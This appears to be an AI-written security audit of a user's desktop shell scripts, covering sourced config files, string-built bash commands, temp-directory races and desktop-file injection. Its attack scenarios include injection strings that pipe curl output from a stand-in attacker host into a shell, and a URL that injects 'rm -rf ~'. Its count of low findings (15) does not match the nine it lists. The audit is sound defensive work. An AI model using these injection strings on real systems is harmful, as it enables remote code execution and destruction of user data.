# Security Audit — omablue/bin

**Date:** 2026-04-23
**Auditor:** Claude Code (claude-sonnet-4-6)
**Scope:** All executable scripts in `/var/home/mino/Vault/mino/omablue/bin/`
**Methodology:** Manual static analysis — command injection, path traversal, privilege escalation, sensitive data exposure, race conditions, insecure temp files, input validation, unsafe downloads, file permission issues, insecure IPC.

---

## Executive Summary

The scripts are generally well-written for a single-user desktop system. Many already use `set -euo pipefail`, restrict permissions on sensitive files, and `omasync-lib.sh` provides a safe key=value config parser. However, several serious issues exist — most critically, the safe parser is **completely bypassed** by raw `source` calls throughout `omasync` and `omasync-setup`, and shell commands are assembled by string concatenation rather than argument arrays. These two patterns alone can chain from a malformed config file into full arbitrary code execution.

**32 findings total:** 3 Critical · 5 High · 9 Medium · 15 Low

---

## Severity Scale

| Severity | Meaning |
|---|---|
| **Critical** | Directly exploitable for code execution or privilege escalation with low effort |
| **High** | Exploitable under realistic conditions or chains into Critical with one more step |
| **Medium** | Requires attacker control of a secondary resource, or degrades security posture |
| **Low** | Defense-in-depth gaps, correctness bugs, or hardening opportunities |

---

## Findings

---

### [C-1] CRITICAL — Arbitrary code execution via `source` of `.conf` files

**Scripts:** `omasync`, `omasync-setup`
**Lines:** `omasync` 30, 54, 62, 85, 87, 91, 189, 203, 205, 210, 297, 337, 358, 365, 386, 393, 395 · `omasync-setup` 272, 342, 381, 415, 417, 433, 447, 478, 492, 515, 557, 566, 576, 578, 600, 616, 640, 656, 666, 712, 744, 759, 783, 798, 825, 842, 908, 924, 946, 962, 976

**Vulnerable code:**
```bash
source "$DEV_CONF"
source "$f" 2>/dev/null || continue
source "$CFG/devices/${device_id}.conf"
source "$CFG/profiles/${pid}.conf" 2>/dev/null || continue
source "$conf_file"
```

**Why it is a vulnerability:**
`source` (`. `) executes every line of the sourced file as shell code. Any file matching the glob `$CFG/**/*.conf` — whether written by the user, dropped by another script, synced from a remote via rsync, or planted by a compromised application — executes with the full privileges of the running user. There is no sandboxing, no validation, and no integrity check.

This is especially egregious because `omasync-lib.sh` already implements a correct, safe key=value parser (`_parse_value`, `load_device`, `load_profile`, `load_link`) that reads only whitelisted keys and treats values as data, never as code. `omasync` and `omasync-setup` both `source omasync-lib.sh` and then completely ignore those safe loaders.

**Attack scenario:**
A remote device synced via omasync writes a `.conf` containing `$(curl http://attacker/payload | bash)`. On the next `omasync` run, that line executes.

**Fix:**
Remove every bare `source "$CFG/..."` call. Replace with the safe loaders from `omasync-lib.sh`:
```bash
# Before (dangerous)
source "$CFG/devices/${device_id}.conf"
echo "$DEVICE_HOST"

# After (safe)
load_device "$device_id"        # sets DEVICE_HOST, DEVICE_PORT, DEVICE_USER globals
echo "$DEVICE_HOST"
```
For loops that iterate configs, replace with:
```bash
# Before
for f in "$CFG/profiles/"*.conf; do source "$f"; done

# After
for f in "$CFG/profiles/"*.conf; do
    profile_id="$(basename "$f" .conf)"
    load_profile "$profile_id"
done
```

**Expected outcome:** Config files are parsed as inert data. A malicious `.conf` file cannot execute code.

---

### [C-2] CRITICAL — Command injection via string-interpolated `bash -lc "...'$VAR'..."`

**Scripts:** `omasync` (lines 438–455), `omasync-setup` (lines 44–48)

**Vulnerable code:**
```bash
# omasync lines 438-442
/bin/bash -lc "'$OMABIN/omasync' --execute-all '$SEL_DEV' '$DRY_FLAG'"

# omasync-setup deploy_ssh_key_interactive lines 44-48
/bin/bash -l -c "ssh-copy-id -i '$key.pub' -p '$port' '$user@$host' \
  && sleep 2 && echo 'Key deployed successfully!'"
```

**Why it is a vulnerability:**
The pattern `"...'$VAR'..."` — single quotes inside a double-quoted string — does **not** provide shell quoting protection. The outer `"..."` allows `$VAR` to expand first; the `'...'` markers are literal characters in the resulting string. Any value of `$VAR` containing a `'` breaks out of the inner single-quote context and injects arbitrary shell code.

For `omasync`: `SEL_DEV` comes from a rofi label derived from config filenames. Linux allows `'` in filenames (`foo';id;#.conf` is valid). A device file with that name produces: `--execute 'foo';id;# ''` — the `id` command runs.

For `omasync-setup`: `$user`, `$host`, and `$port` come directly from `input()` rofi prompts with no sanitization. A username of `foo'; curl http://attacker/x|sh #` produces RCE on "Deploy SSH Key" click.

**Fix:**
Never construct shell strings by interpolation. Pass arguments as argv:
```bash
# omasync — before
/bin/bash -lc "'$OMABIN/omasync' --execute '$SEL_DEV' '$SEL_PRF' '$DRY_FLAG'"

# omasync — after (foot accepts -- to terminate its args)
nohup "$TERMINAL" --app-id="$TUI_CLASS" --title="Omasync" \
    -- "$OMABIN/omasync" --execute "$SEL_DEV" "$SEL_PRF" $DRY_FLAG \
    >/dev/null 2>&1 &

# omasync-setup deploy_ssh_key_interactive — before
/bin/bash -l -c "ssh-copy-id -i '$key.pub' -p '$port' '$user@$host' && ..."

# omasync-setup deploy_ssh_key_interactive — after
nohup "$TERMINAL" --app-id="$TUI_CLASS" --title="Deploy SSH Key to $device_name" \
    -- /bin/bash -c 'ssh-copy-id -i "$1" -p "$2" "$3@$4"; read -rp "Press Enter..."' \
    _ "$key.pub" "$port" "$user" "$host" \
    >/dev/null 2>&1 &
```

**Expected outcome:** Variable values are passed as opaque data to the process, never interpreted as shell syntax.

---

### [C-3] CRITICAL — `sed` injects attacker-controlled values into `source`d config files

**Script:** `omasync-setup`
**Lines:** 626, 676, 934

**Vulnerable code:**
```bash
# line 626
sed -i "s|LOCAL_PATH=.*|LOCAL_PATH=\"$l\"|; \
        s|REMOTE_PATH=.*|REMOTE_PATH=\"$r\"|; \
        s|DIRECTION=.*|DIRECTION=\"$d\"|" "$conf_file"

# line 676
sed -i "s|DEVICE_HOST=.*|DEVICE_HOST=\"$h\"|; \
        s|DEVICE_PORT=.*|DEVICE_PORT=\"$p\"|; \
        s|DEVICE_USER=.*|DEVICE_USER=\"$u\"|" \
        "$CFG/devices/${device_id}.conf"

# line 934
sed -i "s|SYNC_PROFILE=.*|SYNC_PROFILE=\"$sp\"|" "$conf_file"
```

**Why it is a vulnerability:**
`$l`, `$r`, `$d`, `$h`, `$p`, `$u` come from rofi `input()` prompts — free-form user text with no sanitization. Two compounding problems:

1. **`sed` breakout:** A value containing `|`, `"`, or a newline corrupts or breaks out of the `sed` expression.
2. **Config file injection:** These values are written into `.conf` files that are later `source`d (see C-1). A remote path of `"; $(curl http://attacker/x|bash); #` becomes valid shell in the config file and executes on the next `omasync` run.

Even after fixing C-1 (switching to safe loaders), the `sed`-written values still need sanitization because `omasync-lib.sh`'s `_parse_value` strips only leading/trailing quotes — a newline in the value would be written as a second line and interpreted differently.

**Fix:**
Use the existing `save_device_config`, `save_profile_config`, and `save_link_config` helpers in `omasync-lib.sh`. These rewrite configs from scratch using controlled `printf` output, never interpolate user input into sed expressions, and write files atomically via a temp file + `mv`:
```bash
# Before
sed -i "s|DEVICE_HOST=.*|DEVICE_HOST=\"$h\"|" "$CFG/devices/${device_id}.conf"

# After
DEVICE_HOST="$h"
DEVICE_PORT="$p"
DEVICE_USER="$u"
save_device_config "$device_id"
```

**Expected outcome:** User input is stored as a quoted string value in the config. No shell metacharacter in the value can escape into code.

---

### [H-1] HIGH — TOCTOU race on SSH control-socket directory in `/tmp`

**Scripts:** `omasync` (lines 106–107), `omasync-lib.sh` (lines 390–391)

**Vulnerable code:**
```bash
SOCK_DIR="/tmp/omasync-${USER}"
mkdir -p "$SOCK_DIR" && chmod 700 "$SOCK_DIR"
```

**Why it is a vulnerability:**
`mkdir -p` succeeds silently if the directory already exists, regardless of who owns it. On a multi-user system, an attacker can pre-create `/tmp/omasync-victim` owned by themselves with `chmod 777`. When the victim runs omasync:
- `mkdir -p` returns 0 (directory exists — no error)
- `chmod 700` fails silently (victim is not the owner)
- The SSH `ControlPath` socket is created inside the attacker-owned directory
- The attacker can monitor or hijack the SSH multiplexed connection

**Fix:**
Use `mktemp -d` for a unique directory per invocation and clean it up on exit:
```bash
SOCK_DIR="$(mktemp -d -t "omasync-XXXXXX")" || { echo "Cannot create temp dir"; exit 1; }
trap 'rm -rf "$SOCK_DIR"' EXIT INT TERM

# Alternative: verify ownership if you want a persistent dir
mkdir -p "/tmp/omasync-${USER}"
[[ -O "/tmp/omasync-${USER}" ]] || { echo "Temp dir ownership check failed"; exit 1; }
chmod 700 "/tmp/omasync-${USER}"
```

**Expected outcome:** No other user can pre-claim the socket directory. SSH control sockets are isolated per invocation.

---

### [H-2] HIGH — Unvalidated PID file read passed directly to `kill`

**Script:** `omablue-caffeine`
**Lines:** 35–38, 47–48

**Vulnerable code:**
```bash
PID=$(cat "$PID_FILE")
if kill -0 "$PID" 2>/dev/null; then
    ...
    kill "$PID" 2>/dev/null
fi
```

**Why it is a vulnerability:**
`~/.cache/omablue-caffeine.pid` is stored in `~/.cache`, which is typically world-readable (mode 755 on Fedora). Any compromised process running as this user can overwrite the PID file with an arbitrary integer. The script reads it and passes it directly to `kill` without validation, allowing an attacker to kill any user-owned process (session manager, compositor, SSH agent, etc.) to force a denial of service or trigger re-authentication.

Additionally `~/.cache/omablue-caffeine.state` is world-readable, leaking whether caffeine mode is active.

**Fix:**
```bash
# Validate PID is a positive integer
PID=$(cat "$PID_FILE" 2>/dev/null)
[[ "$PID" =~ ^[0-9]+$ ]] || { rm -f "$PID_FILE"; exit 1; }

# Verify the PID actually belongs to the expected process
expected_comm="omablue-caffeine"
actual_comm=$(cat "/proc/$PID/comm" 2>/dev/null || echo "")
[[ "$actual_comm" == "$expected_comm" ]] || { rm -f "$PID_FILE"; exit 1; }

kill "$PID" 2>/dev/null
```

Move state and PID files to `$XDG_RUNTIME_DIR` (mode 700, only accessible by the user):
```bash
PID_FILE="$XDG_RUNTIME_DIR/omablue-caffeine.pid"
STATE_FILE="$XDG_RUNTIME_DIR/omablue-caffeine.state"
```

**Expected outcome:** The `kill` target is always the correct process. No other local user can read or manipulate caffeine state.

---

### [H-3] HIGH — Path traversal via unsanitized theme/app name

**Scripts:** `omablue-theme-set` (line 19), `omablue-tui-install` (lines 53, 78), `omablue-webapp-install` (lines 113, 133)

**Vulnerable code:**
```bash
# omablue-theme-set
THEME_PATH="$THEMES_DIR/$THEME_NAME"           # line 19
ln -nsf "$THEME_PATH" "$CURRENT_LINK"          # line 35

# omablue-tui-install
ICON_DEST="$HOME/.local/share/applications/icons/$APP_NAME.png"
DESKTOP_FILE="$HOME/.local/share/applications/$APP_NAME.desktop"
```

**Why it is a vulnerability:**
`THEME_NAME` is derived from `$1` via `sed` and `tr`, but `omablue-theme-set`'s `tr` does not reject `/`. A caller can pass `../../.config/autostart/evil` as a theme name; after the transformations it may remain intact enough to resolve outside `$THEMES_DIR`. The `ln -nsf` then creates a symlink at an attacker-chosen location pointing to an attacker-chosen target.

`omablue-tui-install` filters `APP_NAME` with `tr -cd '[:alnum:] _-'` which blocks `.` and `/` — better, but allows spaces that can still break downstream `sed` patterns.

**Fix:**
After any `tr`/`sed` sanitization, enforce a strict allowlist and reject path separators:
```bash
# Strict allowlist: lowercase letters, digits, hyphens, underscores only
THEME_NAME=$(echo "$THEME_NAME" | tr -cd 'a-z0-9_-')
[[ "$THEME_NAME" =~ ^[a-z0-9][a-z0-9_-]{0,63}$ ]] || {
    notify-send -u critical "Omablue Error" "Invalid theme name."
    exit 1
}
# Verify the resolved path stays under the expected base
real_base=$(realpath "$THEMES_DIR")
real_path=$(realpath -m "$THEMES_DIR/$THEME_NAME")
[[ "$real_path" == "$real_base"/* ]] || exit 1
```

**Expected outcome:** No filename constructed from external input can reference a path outside its intended directory.

---

### [H-4] HIGH — Injection filter in `omablue-launch-tui` is bypassable; desktop files are unsigned

**Script:** `omablue-launch-tui` (lines 23–32)

**Vulnerable code:**
```bash
if [[ "$CMD_EXEC" =~ [\;\&\|\`\$\(] ]]; then
    notify-send -u critical "Omablue Error" "Invalid command in launcher."
    exit 1
fi
exec foot --app-id="$APP_ID" sh -c "$CMD_EXEC"
```

**Why it is a vulnerability:**
1. **Incomplete blocklist:** The filter does not cover `>`, `<`, newlines (`$'\n'`), `{`, `}`, `!`, `\`, or null bytes. Commands using redirection or brace expansion bypass the check.
2. **Desktop file trust:** `$CMD_EXEC` comes from `.desktop` files in `~/.local/share/applications/`. These files are user-writable and not signed or integrity-checked. Any process running as this user (a malicious flatpak, browser extension, npm package, etc.) can rewrite a `.desktop` file to contain an arbitrary command that bypasses the filter on the next menu click.
3. **`sh -c "$CMD_EXEC"`:** String interpolation into `sh -c` is always dangerous when the input is not fully trusted.

**Fix:**
Store the command as an argument array in the desktop file, not as a string. Change the desktop file format:
```ini
# Instead of:
Exec=/path/to/omablue-launch-tui 'com.app.Class' 'myapp --flag'

# Use a dedicated wrapper that exec's directly:
Exec=/path/to/omablue-tui-wrapper com.app.Class myapp --flag
```

In the wrapper:
```bash
#!/bin/bash
APP_ID="$1"; shift
exec foot --app-id="$APP_ID" -- "$@"
```

**Expected outcome:** The command is never passed through a shell interpreter. Shell metacharacters in app arguments are harmless data.

---

### [H-5] HIGH — Desktop file `Exec` injection via unescaped single quotes in app/URL values

**Scripts:** `omablue-tui-install` (lines 84–95), `omablue-webapp-install` (lines 140–151)

**Vulnerable code:**
```bash
# omablue-tui-install
echo "Exec=$LAUNCHER_SCRIPT '$APP_CLASS' '$APP_EXEC'" >> "$DESKTOP_FILE"

# omablue-webapp-install
echo "Exec=$LAUNCHER_SCRIPT '$APP_URL' '$APP_PROFILE_FOLDER' '$BROWSER_BIN'" >> "$DESKTOP_FILE"
```

**Why it is a vulnerability:**
The FreeDesktop `.desktop` `Exec` key has its own quoting grammar (backslash-escape, not shell quoting). The scripts wrap values in single quotes, but `APP_EXEC`, `APP_URL`, and `APP_PROFILE_FOLDER` are not escaped. A value containing `'` closes the wrapping quote: URL `https://x.com/'; rm -rf ~; #` produces a valid `Exec` line that executes `rm -rf ~` on launch.

**Fix:**
Escape single quotes in all values written to `Exec` lines. Per the FreeDesktop spec, values must be percent-encoded or the whole `Exec` value double-quoted with backslash escaping:
```bash
# Escape ' -> '\'' for shell-safe single-quoting
escape_arg() { printf '%s' "$1" | sed "s/'/'\\\\''/g"; }

APP_EXEC_ESCAPED=$(escape_arg "$APP_EXEC")
APP_CLASS_ESCAPED=$(escape_arg "$APP_CLASS")
echo "Exec=$LAUNCHER_SCRIPT '$APP_CLASS_ESCAPED' '$APP_EXEC_ESCAPED'" >> "$DESKTOP_FILE"
```

Or, simplest fix: reject any input containing `'`, `\`, or newlines at the validation step.

**Expected outcome:** No value passed by the user during install can inject shell commands into the generated desktop file.

---

### [M-1] MEDIUM — Hotspot password stored in plaintext; exposed in `/proc`

**Scripts:** `new-nmcli` (lines 9, 39, 42, 51), `omablue-nmcli` (lines 20, 65, 68, 94)

**Vulnerable code:**
```bash
PASS_FILE="$CONFIG_DIR/hotspot_pass"
echo "$NEW_PASS" > "$PASS_FILE"
chmod 600 "$PASS_FILE"
...
nmcli device wifi hotspot ssid "$(hostname)" password "$HPASS"
```

**Why it is a vulnerability:**
1. **Plaintext file:** Although `chmod 600`, the password is readable by any process running as this user and included in any backup or cloud sync.
2. **`/proc` exposure:** During the `nmcli ... password "$HPASS"` call, the password is visible in `/proc/<pid>/cmdline` to all local users for the duration of the command. (Acknowledged in `omablue-nmcli` line 135 but not fixed.)

NetworkManager stores passwords encrypted in its own keyring. Creating a saved connection profile avoids both issues.

**Fix:**
Create the hotspot profile once (manually or via a setup script) and never store the password again:
```bash
# One-time setup (run once, interactively)
nmcli connection add type wifi ifname wlan0 con-name Hotspot autoconnect no \
    ssid "$(hostname)" \
    802-11-wireless.mode ap \
    ipv4.method shared \
    wifi-sec.key-mgmt wpa-psk \
    wifi-sec.psk "$(read -rsp 'Hotspot password: ' p; echo "$p")"

# Subsequent starts — no password needed
nmcli connection up Hotspot
```

Remove `PASS_FILE` references and the `read-password-from-file` code paths.

**Expected outcome:** The password is stored in NetworkManager's encrypted connection database. It never appears in a plaintext file, in `$PATH`, or in `/proc`.

---

### [M-2] MEDIUM — User-writable directories first in `$PATH` allow binary hijacking

**Scripts:** `omablue-tui-install` (line 6), `omablue-webapp-install` (line 6), `omablue-install-ujust` (line 6)

**Vulnerable code:**
```bash
export PATH="$HOME/.local/share/omablue/bin:$HOME/.local/bin:/usr/local/bin:/usr/bin:/bin:$PATH"
```

**Why it is a vulnerability:**
Placing user-writable directories before system directories means any process running as this user can drop a trojanized binary named `curl`, `file`, `gum`, `jq`, or `flatpak` into `~/.local/share/omablue/bin/`. The next time an installer script runs, it calls the malicious binary instead of the system one. This is a classic `$PATH` hijack. `omablue-bluetooth` correctly demonstrates the safe pattern.

**Fix:**
Put system paths first:
```bash
export PATH="/usr/bin:/usr/local/bin:/bin:$HOME/.local/share/omablue/bin:$HOME/.local/bin${PATH:+:$PATH}"
```

For security-critical commands (`curl`, `ssh`, `rsync`), use absolute paths:
```bash
/usr/bin/curl -sL ...
/usr/bin/ssh ...
```

**Expected outcome:** System binaries take precedence. A compromised user-writable directory cannot intercept system command calls.

---

### [M-3] MEDIUM — Unsafe icon download: follows redirects, no TLS enforcement, advisory size cap

**Scripts:** `omablue-tui-install` (line 57), `omablue-webapp-install` (line 117)

**Vulnerable code:**
```bash
if ! curl -sL --max-filesize 5242880 -o "$ICON_DEST" "$ICON_REF"; then
```

**Why it is a vulnerability:**
- `-L` follows HTTP redirects without a hop limit, enabling redirect chains to attacker-controlled servers.
- No `--proto '=https'` enforcement — HTTP URLs accepted, susceptible to MITM.
- `--max-filesize` checks the `Content-Length` response header, which a server can omit or lie about for chunked transfers. A server can stream more than 5MB.
- The file is written to `~/.local/share/applications/icons/` and subsequently rendered by GTK icon loaders on every menu open, exposing image-parsing libraries (ImageMagick, gdk-pixbuf) to attacker-controlled data.

**Fix:**
```bash
/usr/bin/curl \
    --proto '=https' \
    --tlsv1.2 \
    --max-redirs 3 \
    --max-filesize 5242880 \
    --fail-with-body \
    -sL \
    -o "$ICON_DEST" \
    "$ICON_REF"

# Recheck actual size after download (curl --max-filesize is advisory)
actual_size=$(stat -c%s "$ICON_DEST" 2>/dev/null || echo 0)
if (( actual_size > 5242880 )); then
    rm -f "$ICON_DEST"
    echo "Icon exceeds size limit" >&2
    exit 1
fi

# Validate it is actually an image
file_type=$(file --mime-type -b "$ICON_DEST")
[[ "$file_type" == image/* || "$file_type" == "image/svg+xml" ]] || {
    rm -f "$ICON_DEST"
    echo "Downloaded file is not an image: $file_type" >&2
    exit 1
}
```

**Expected outcome:** Icon downloads are TLS-only, size-bounded by actual byte count, and validated as image data before being saved.

---

### [M-4] MEDIUM — Theme color values written to config files without format validation

**Script:** `omablue-theme-generate`
**Lines:** 39, 58–220

**Vulnerable code:**
```bash
# Parser (line 39) — strips quotes, assigns raw value
COLORS["$key"]="$value"

# Generator — writes directly into waybar CSS, dunstrc, foot.ini, etc.
@define-color background $(get_color background "#1e1e2e");
```

**Why it is a vulnerability:**
The parser reads values from `colors.toml` and assigns them to a bash associative array without validating that they are valid hex color codes. A malicious or hand-crafted `colors.toml` with `background = "#fff; background-image: url(http://evil/track.gif)"` writes that string verbatim into `waybar-colors.css`. This produces visual spoofing at minimum, and potentially exfiltrates system information via the embedded URL fetched by the compositor. For `dunstrc`, future Dunst versions that support action scripts could escalate this further.

**Fix:**
Validate every value against the hex color format before accepting it:
```bash
get_color() {
    local key="$1"
    local default="$2"
    local value="${COLORS[$key]:-$default}"
    # Accept only valid 3, 4, 6, or 8 digit hex colors
    if [[ ! "$value" =~ ^#[0-9a-fA-F]{3}([0-9a-fA-F]{1}|[0-9a-fA-F]{3}|[0-9a-fA-F]{5})?$ ]]; then
        echo "ERROR: Invalid color value for '$key': '$value'" >&2
        exit 1
    fi
    echo "$value"
}
```

**Expected outcome:** Only valid CSS hex color codes are written into generated config files. Arbitrary strings from `.toml` cannot inject content into downstream configurations.

---

### [M-5] MEDIUM — `omablue-menu` assembles `bash -l -c "$script_path"` by string interpolation

**Script:** `omablue-menu` (line 52)

**Vulnerable code:**
```bash
nohup "$TERMINAL" \
    --app-id="$TUI_CLASS" \
    --title="$UNIQUE_TITLE" \
    /bin/bash -l -c "$script_path" >/dev/null 2>&1 &
```

**Why it is a vulnerability:**
`$script_path` is passed as a string to `bash -c`, not as an argument. If `$script_path` (derived from `$OMABIN`) contains a space, `$`, or `'`, the shell interprets part of the path as arguments or code. All current callers use fixed `$OMABIN/omablue-*` paths — low exploitability today. But the pattern becomes RCE if any future caller ever passes user-derived input, or if `$OMABIN` is set to a path containing spaces.

**Fix:**
```bash
# Before
/bin/bash -l -c "$script_path"

# After — script_path is data, not code
/bin/bash -l -c 'exec "$1"' _ "$script_path"
```

**Expected outcome:** `$script_path` is treated as a file path argument, not as shell syntax.

---

### [M-6] MEDIUM — `ls | tail` for log rotation with glob using attacker-influenced `DEV_ID`

**Script:** `omasync` (lines 156–157, 280–281), `omasync-lib.sh` (line 479)

**Vulnerable code:**
```bash
mapfile -t OLD_LOGS < <(ls -t "$DATA/logs/${DEV_ID}_${prf_log_id}_"*.log 2>/dev/null | tail -n +11) || true
for f in "${OLD_LOGS[@]}"; do rm -f "$f"; done
```

**Why it is a vulnerability:**
`DEV_ID` and `prf_log_id` come from config filenames. If a device config filename contains `*` or `..`, the glob expands into unrelated files, potentially deleting logs outside the intended directory. Parsing `ls` output also breaks silently for filenames with spaces or newlines (not a security issue on its own, but a correctness bug that masks the real deletion list).

**Fix:**
```bash
mapfile -t OLD_LOGS < <(
    find "$DATA/logs" -maxdepth 1 \
        -name "${DEV_ID}_${prf_log_id}_*.log" \
        -printf '%T@ %p\0' \
    | sort -rz -n \
    | awk -v RS='\0' 'NR>10{sub(/^[^ ]+ /, ""); print}' \
    | tr '\n' '\0' \
    | xargs -0 -r echo
)
for f in "${OLD_LOGS[@]}"; do [[ -f "$f" ]] && rm -f "$f"; done
```

**Expected outcome:** Log rotation operates only on the intended files. Filenames with special characters are handled correctly.

---

### [M-7] MEDIUM — Tailscale/LAN hostnames unvalidated before being written to `source`d configs

**Script:** `omasync-setup` (line 200, `manual_add_device` function)

**Vulnerable code:**
```bash
host=$(input "Enter device IP or hostname")
# ...written directly to .conf file via sed (see C-3)
```

**Why it is a vulnerability:**
`host` is free-form rofi input with no character restriction. In isolation this might be Medium, but because the value is written to a `.conf` file via `sed` (C-3) and that file is later `source`d (C-1), it is a direct path to RCE. The chain is: hostile hostname → written to `.conf` via `sed` → `source`d → code execution.

**Fix:**
Validate immediately after `input()`, before any use:
```bash
host=$(input "Enter device IP or hostname (e.g. 192.168.1.10 or mydevice)")
[[ "$host" =~ ^[a-zA-Z0-9][a-zA-Z0-9.:_-]{0,253}$ ]] || {
    notify-send -u critical "Omablue" "Invalid hostname: '$host'"
    exit 1
}
```

**Expected outcome:** Only valid hostname/IP characters are accepted. Shell metacharacters in the input are rejected before reaching any file or command.

---

### [M-8] MEDIUM — `$XDG_RUNTIME_DIR` used without fallback under `set -u`

**Script:** `omablue-bluetooth-autoconnect` (line 12)

**Vulnerable code:**
```bash
FLAG_DIR="$XDG_RUNTIME_DIR"
```

**Why it is a vulnerability:**
With `set -u` (line 2), if `XDG_RUNTIME_DIR` is unset — which can happen when invoked from cron, a systemd unit without PAM, or a minimal environment — the script exits with `unbound variable`. More critically, if `set -u` is ever removed, `FLAG_DIR` becomes an empty string, and `find "$FLAG_DIR" ...` silently operates on the current working directory.

**Fix:**
```bash
FLAG_DIR="${XDG_RUNTIME_DIR:-/run/user/$(id -u)}"
[[ -d "$FLAG_DIR" && -O "$FLAG_DIR" ]] || {
    echo "ERROR: XDG_RUNTIME_DIR is not available or not owned by current user." >&2
    exit 1
}
```

**Expected outcome:** The script fails fast with a clear error if the runtime directory is unavailable, rather than silently operating on an unintended directory.

---

### [M-9] MEDIUM — Trivalent profile `--profile-directory` not validated; missing `--` terminator

**Script:** `omablue-launch-trivalent` (line 43)

**Vulnerable code:**
```bash
nohup trivalent --profile-directory="$SELECTED_ID" >/dev/null 2>&1 &
```

**Why it is a vulnerability:**
`SELECTED_ID` is parsed from Trivalent's `Local State` JSON using `jq`. If that JSON file is overwritten by a malicious process, `SELECTED_ID` could contain a value like `foo --no-sandbox --remote-debugging-port=9222`, injecting additional flags. The `--` terminator is missing, which allows values starting with `-` to be interpreted as flags.

**Fix:**
```bash
# Validate profile name matches known Chromium profile formats
[[ "$SELECTED_ID" =~ ^(Default|Profile\ [0-9]+|GUEST_SESSION)$ ]] || {
    notify-send -u critical "Omablue Error" "Invalid profile ID: $SELECTED_ID"
    exit 1
}
nohup trivalent --profile-directory="$SELECTED_ID" -- >/dev/null 2>&1 &
```

**Expected outcome:** Only known-good profile identifiers are passed to Trivalent. No flag injection is possible.

---

### Low Findings Summary

| ID | Script | Issue | Fix |
|---|---|---|---|
| L-1 | `omablue-screenshot` | `$1` with `set -u` crashes when called with no args | Change `"$1"` to `"${1:-}"` |
| L-2 | `omablue-caffeine` | State/PID files in `~/.cache` (mode 755, world-readable) | Move to `$XDG_RUNTIME_DIR` (already covered in H-2) |
| L-3 | `omablue-tuned` | `run0 tuned-adm profile "$TARGET"` missing `--` terminator | Change to `run0 -- tuned-adm profile "$TARGET"` |
| L-4 | `omablue-menu-keybindings` | Missing `set -euo pipefail` | Add at top of script |
| L-5 | `omablue-battery-monitor`, `omablue-battery-remaining` | `grep 'BAT'` too loose (matches any device with "BAT" in name) | Use `grep -E '/battery_BAT[0-9]+$'` |
| L-6 | `omablue-bluetooth` | `SCAN_PID` subshell kill doesn't reap child `bluetoothctl` | Add `pkill -P "$SCAN_PID"` in `cleanup_scan` |
| L-7 | `omasync-setup` | SSH key generated without verifying `ssh-keygen` returned success before `wl-copy` | Add `|| exit 1` after `ssh-keygen` |
| L-8 | `new-nmcli`, `omablue-nmcli` | `grep 'BAT'`-style: `grep 'psk'` too loose for WPA detection | Use explicit key-mgmt check |
| L-9 | `omablue-theme-set-gnome` | `ICON_NAME` from file passed to `gsettings` without stripping newlines | `ICON_NAME=$(tr -d '\n' < "$THEME_CURRENT/icons.theme")` |

---

## Remediation Roadmap

### Phase 1 — Critical / This Week

These three issues are the highest-risk findings. They can chain together for full code execution from a malformed config file.

#### Task C-1 and C-3: Replace `source` and `sed` config writes with safe loaders

**File:** `omasync-setup`

1. Grep for all `source "$CFG/` occurrences: `grep -n 'source "\$CFG' omasync-setup`
2. For each, identify which variables are used immediately after.
3. Replace with `load_device "$id"` / `load_profile "$id"` / `load_link "$dev" "$prf"` from `omasync-lib.sh`.
4. Replace all `sed -i "s|KEY=.*|KEY=\"$val\"|"` with calls to `save_device_config` / `save_profile_config` / `save_link_config`.
5. Run `shellcheck omasync-setup` and verify no `source` on external files remains.

**File:** `omasync`

1. Grep: `grep -n 'source "\$' omasync`
2. Same replacement pattern.
3. Verify with `shellcheck omasync`.

**Test:** Create a `.conf` file containing `echo PWNED > /tmp/omasync_audit_test` and run `omasync`. Confirm `/tmp/omasync_audit_test` is NOT created.

---

#### Task C-2: Replace all `bash -lc "...'$VAR'..."` with argv forms

**File:** `omasync`

1. Find: `grep -n 'bash -lc' omasync`
2. Rewrite each to use `nohup "$TERMINAL" ... -- "$OMABIN/omasync" "$arg1" "$arg2"` forms.

**File:** `omasync-setup`

1. Find: `grep -n 'bash -l -c' omasync-setup`
2. Rewrite `deploy_ssh_key_interactive` to pass `$key`, `$port`, `$user`, `$host` as positional parameters to an inner `bash -c '...' _ "$@"`.

**Test:** Create a device ID with a `'` in its name. Run the interactive execute flow. Confirm the `'` causes an error message, not shell execution.

---

### Phase 2 — High / This Sprint

#### Task H-1: Fix TOCTOU on SSH socket directory

**File:** `omasync`, `omasync-lib.sh`

1. Find both `SOCK_DIR=` assignments.
2. Replace `mkdir -p "$SOCK_DIR" && chmod 700 "$SOCK_DIR"` with:
   ```bash
   SOCK_DIR="$(mktemp -d -t "omasync-XXXXXX")"
   trap 'rm -rf "$SOCK_DIR"' EXIT INT TERM
   ```
3. Update any hardcoded `ControlPath` strings that reference the old `$SOCK_DIR` path format to use `$SOCK_DIR/ctrl-%r@%h:%p`.

**Test:** As a second system user (or via a test script), pre-create `/tmp/omasync-$(logname)` owned by root. Run omasync. Confirm it does not use that directory.

---

#### Task H-2: Fix PID file validation in `omablue-caffeine`

1. Move `PID_FILE` and `STATE_FILE` to `$XDG_RUNTIME_DIR`.
2. Add integer validation and `/proc` comm check before `kill`.
3. Test: write `1` to the PID file (init). Confirm `omablue-caffeine` rejects it.

---

#### Task H-3: Enforce strict name allowlist and path containment

**Files:** `omablue-theme-set`, `omablue-tui-install`, `omablue-webapp-install`

1. After any `tr`/`sed` transformation, add the `realpath` containment check.
2. Test: call `omablue-theme-set '../../etc/passwd'`. Confirm it exits with error.

---

#### Task H-4 and H-5: Fix desktop file injection

**Files:** `omablue-launch-tui`, `omablue-tui-install`, `omablue-webapp-install`

1. Redesign `omablue-launch-tui` to `exec` a stored argv list instead of `sh -c "$string"`.
2. In installers, add single-quote escaping for all values written to `Exec` lines.
3. Test: install an app with a `'` in its `APP_EXEC`. Confirm the apostrophe is escaped in the `.desktop` file and the app launches correctly.

---

### Phase 3 — Medium / Next Sprint

| Task | File(s) | Action |
|---|---|---|
| M-1 | `new-nmcli`, `omablue-nmcli` | Remove plaintext password file; create NM saved profile |
| M-2 | `omablue-tui-install`, `omablue-webapp-install`, `omablue-install-ujust` | Reorder `$PATH` to put `/usr/bin:/bin` first |
| M-3 | `omablue-tui-install`, `omablue-webapp-install` | Add `--proto '=https'`, post-download `stat` size check, keep `file --mime-type` validation |
| M-4 | `omablue-theme-generate` | Add `^#[0-9a-fA-F]{3,8}$` validation in `get_color` |
| M-5 | `omablue-menu` | Change `bash -l -c "$path"` to `bash -l -c 'exec "$1"' _ "$path"` |
| M-6 | `omasync`, `omasync-lib.sh` | Replace `ls \| tail` with `find -printf + sort + awk` |
